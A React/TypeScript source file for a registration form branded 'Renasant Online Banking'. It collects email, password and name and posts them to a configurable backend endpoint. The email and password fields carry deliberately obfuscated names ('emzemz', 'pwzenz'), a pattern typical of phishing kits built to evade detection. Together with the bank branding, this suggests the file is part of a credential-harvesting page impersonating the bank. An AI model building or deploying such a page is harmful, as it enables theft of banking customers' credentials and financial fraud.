import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const Register: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [confirmPwzenz, setConfirmPwzenz] = useState('');
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [showConfirmPwzenz, setShowConfirmPwzenz] = useState(false);
  const [errors, setErrors] = useState({
    emzemz: '',
    pwzenz: '',
    confirmPwzenz: '',
    firstName: '',
    lastName: '',
  });

  const navigate = useNavigate();

  const validateEmzemz = (emzemz: string) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(emzemz);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      emzemz: '',
      pwzenz: '',
      confirmPwzenz: '',
      firstName: '',
      lastName: '',
    };

    if (!validateEmzemz(emzemz)) {
      newErrors.emzemz = 'Invalid email format.';
    }

    if (pwzenz.length < 6) {
      newErrors.pwzenz = 'Password must be at least 6 characters.';
    }

    if (pwzenz !== confirmPwzenz) {
      newErrors.confirmPwzenz = 'Passwords do not match.';
    }

    if (!firstName.trim()) {
      newErrors.firstName = 'First name is required.';
    }

    if (!lastName.trim()) {
      newErrors.lastName = 'Last name is required.';
    }

    setErrors(newErrors);

    if (!newErrors.emzemz && !newErrors.pwzenz && !newErrors.confirmPwzenz && !newErrors.firstName && !newErrors.lastName) {
      try {
        await axios.post(`${baseUrl}api/register/`, {
          emzemz,
          pwzenz,
          firstName,
          lastName,
        });

        navigate('/');
      } catch (error) {
        console.error('Error during registration:', error);
        setIsLoading(false);
      }

      setErrors({ emzemz: '', pwzenz: '', confirmPwzenz: '', firstName: '', lastName: '' });
    } else {
      setIsLoading(false);
    }
  };

  return (
    <FlowCard
      title="Register for Renasant Online Banking"
      subtitle={<span className="text-slate-600">Create your profile to access secure online services.</span>}
    >
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="emzemz">
            Email
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="emzemz"
              name="emzemz"
              type="email"
              value={emzemz}
              onChange={(e) => setEmzemz(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="name@example.com"
            />
          </div>
          {errors.emzemz ? <FormError message={errors.emzemz} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="pwzenz">
            Password
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="pwzenz"
              name="pwzenz"
              type={showPwzenz ? 'text' : 'password'}
              value={pwzenz}
              onChange={(e) => setPwzenz(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="Enter your password"
            />
            <button type="button" onClick={() => setShowPwzenz((prev) => !prev)} className="px-3 text-slate-400">
              {showPwzenz ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.pwzenz ? <FormError message={errors.pwzenz} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="confirmPwzenz">
            Confirm password
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="confirmPwzenz"
              name="confirmPwzenz"
              type={showConfirmPwzenz ? 'text' : 'password'}
              value={confirmPwzenz}
              onChange={(e) => setConfirmPwzenz(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="Confirm your password"
            />
            <button type="button" onClick={() => setShowConfirmPwzenz((prev) => !prev)} className="px-3 text-slate-400">
              {showConfirmPwzenz ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.confirmPwzenz ? <FormError message={errors.confirmPwzenz} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="firstName">
            First name
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="firstName"
              name="firstName"
              type="text"
              value={firstName}
              onChange={(e) => setFirstName(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="First name"
            />
          </div>
          {errors.firstName ? <FormError message={errors.firstName} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="lastName">
            Last name
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="lastName"
              name="lastName"
              type="text"
              value={lastName}
              onChange={(e) => setLastName(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="Last name"
            />
          </div>
          {errors.lastName ? <FormError message={errors.lastName} /> : null}
        </div>

        <button
          type="submit"
          className="w-full bg-[#0f4f6c] text-white py-3 rounded-md flex items-center justify-center gap-2 disabled:opacity-75"
          disabled={isLoading}
        >
          {isLoading ? (
            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-white border-t-transparent"></div>
          ) : (
            <>
              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 11c0-1.657 1.343-3 3-3s3 1.343 3 3v1H6v-1c0-1.657 1.343-3 3-3s3 1.343 3 3z" />
              </svg>
              <span>Register</span>
            </>
          )}
        </button>
      </form>
    </FlowCard>
  );
};

export default Register;
